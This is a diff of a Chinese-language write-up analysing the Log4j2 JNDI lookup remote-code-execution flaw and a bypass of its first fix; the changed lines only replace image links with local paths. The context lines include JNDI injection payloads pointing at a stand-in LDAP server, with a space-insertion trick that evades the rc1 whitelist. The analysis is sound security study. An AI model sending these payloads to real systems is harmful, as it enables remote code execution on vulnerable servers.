@@ -65,7 +65,7 @@ public static void main(String[] args) throws Exception {    logger.error("${jnd
 
 截图如下
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCAbt2aQ2u3iaF44drzDjnVEuV8WQAfmswt9lDccupRMnhw7Jric8AhcdQ/640?wx_fmt=png)
+![](../../.resource/remote/c0f79ae4e1e73b1df7df23582d94d658e66f037378ab40152a2f6414e838db45.png)
 
 0x01 RCE 分析
 -----------
@@ -148,7 +148,7 @@ private StringBuilder toText(final Serializer2 serializer, final LogEvent event,
 
 这里的`formatters`方法包含了多个`formatter`对象，其中出发漏洞的是第 8 个，其中包含`MessagePatternConverter`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCdgIiambDEbAhBV2kX1sxGQUxhxFPJCPgTfRJ2SskttLia8P8ClgpuQHA/640?wx_fmt=png)
+![](../../.resource/remote/f49f7d12f437df1a28678ebebf3602ea5019db1edabc6edb428e4f691fdf2a15.png)
 
 跟入看到调用了`Converter`相关的方法
 
@@ -158,7 +158,7 @@ public void format(final LogEvent event, final StringBuilder buf) {    if (skipF
 
 不难看出每个`formatter`和`converter`为了构造日志的每一部分，这里在构造真正的日志信息字符串部分
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCXvepb9bgMEMiaYqaoCx8kANBGtusyjUFQ2DliaFgichYujYUnseXUWk8w/640?wx_fmt=png)
+![](../../.resource/remote/383bae6bd95b9d3b693675cf5f48bf4bfac1348b43cc8e2375db0c370e963bd4.png)
 
 跟入`MessagePatternConverter.format`方法，看到核心的部分
 
@@ -190,7 +190,7 @@ private int substitute(final LogEvent event, final StringBuilder buf, final int 
 
 这里的递归处理成功地让`jndi:ldap://127.0.0.1:1389/badClassName`进入`resolveVariable`方法
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCgqBZjn9MicjUmyqhIZRwT3XGsGGOic7v6UIMQic0kY9S6F1gpOA4kl27A/640?wx_fmt=png)
+![](../../.resource/remote/02941aa8940dafc607ce4fda516560b379fb5991116f15b74905a3014e857986.png)
 
 经过调试确认了关键方法`resolveVariable`
 
@@ -206,7 +206,7 @@ protected String resolveVariable(final LogEvent event, final String variableName
 
 这里的`strLookupMap`中包含了多种`Lookup`对象
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCGcMgb1yK7lNK9A9hjv3HRgWgDSUSRowo0tBt6ld8awnFXk0XeKZXuQ/640?wx_fmt=png)
+![](../../.resource/remote/b6a2d13e84345ed21c4da78b9dc5bc5aae7e2793980925143227b9e6699d2a0e.png)
 
 类似地，可以看这样利用
 
@@ -243,7 +243,7 @@ logger.error("${java:runtime}");// 打印00:36:26.312 [main] ERROR Main - Java(T
 
 在修复后变成了`MessagePatternConverter.SimplePatternConverter`类
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCYb0jps2YsfO5ZOuibwT2X635VuRfGA1uvtDk7PXhWADlfmiasLtic69jg/640?wx_fmt=png)
+![](../../.resource/remote/f1f81da03e63ddc49f60955b751e861a2d7b41b4622561802fe4bd98cdb41c0a.png)
 
 可以发现在这个类中变成了直接拼接字符串的操作，不去判断`${}`这种情况
 
@@ -273,7 +273,7 @@ final Configuration config = new DefaultConfigurationBuilder().build(true);// �
 
 成功开启`lookups`功能，调用`LookupMessagePatternConverter.fomat`方法
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCON3E6oc6cBVt3H6h6XlyqgRTQIotwIRISicljAaiadPR8HoCkUASoSPQ/640?wx_fmt=png)
+![](../../.resource/remote/e599eca91f6a265d988b5908db3eed584619c946f5c142521ac5498bfd0f3862.png)
 
 递归处理等过程均没有变化，最后`JndiManager.lookup`触发漏洞的地方进行了修改
 
@@ -283,7 +283,7 @@ public synchronized <T> T lookup(final String name) throws NamingException {    
 
 看看实际运行中，这几个白名单是怎样的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCvFPlyUHsOIrO6nOqMSKP3ywdwuOyJZqlKw8MKpj64w1H6w5e1lOnuA/640?wx_fmt=png)
+![](../../.resource/remote/b7d6902bcd45d1b6ed87863648f038a688e8b04ec803333ea74205cd1b31c525.png)
 
 默认的协议是：`java`，`ldap`，`ldaps`
 
@@ -293,7 +293,7 @@ public synchronized <T> T lookup(final String name) throws NamingException {    
 
 实际上拦住`Payload`是在最后一处`OBJECT_FACTORY`判断
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCUs9WWicIpzy8rI3ddOoWsdBOpXg6vdN9nPkkAmmI1sSuTJTnbKjdYkw/640?wx_fmt=png)
+![](../../.resource/remote/a0f4117fd45d7df225eb4edb444b7541862593a456c528fc215ee7b4f5dbc071.png)
 
 由于 RCE 一定需要加载远程对象，那么避免不了`javaFactory`属性（或者有一些其他思路，笔者刚做 Java 安全不了解）
 
@@ -309,11 +309,11 @@ public synchronized <T> T lookup(final String name) throws NamingException {    
 
 经过测试发现`URI`中不进行`URL`编码会报这个错，加个空格即可触发`${jndi:ldap://127.0.0.1:1389/ badClassName}`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRC5NiaHqRsCsD2ibqYDWOafC9JphH88R1ZRw02BADjA8MHU3KqL3WvEFng/640?wx_fmt=png)
+![](../../.resource/remote/6877f7b61ce0b6de659ac95f3457a0e9fefb79ac0ba3f0857abcbea15326d3a2.png)
 
 成功 RCE（需要用户开启`lookup`功能的基础上才可以）
 
-![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrN79GZMN2UQfia2BOXVgMRCe7blCFIEo23c5iavTrxaYIEWSXjZkevia1ANcd3LISa6pSzialM3vPKzg/640?wx_fmt=png)
+![](../../.resource/remote/e90522adf675253552fc963bb254051635c62d7a73e5f5fef180b1a81e1a0565.png)
 
 0x04 RC2 修复
 -----------
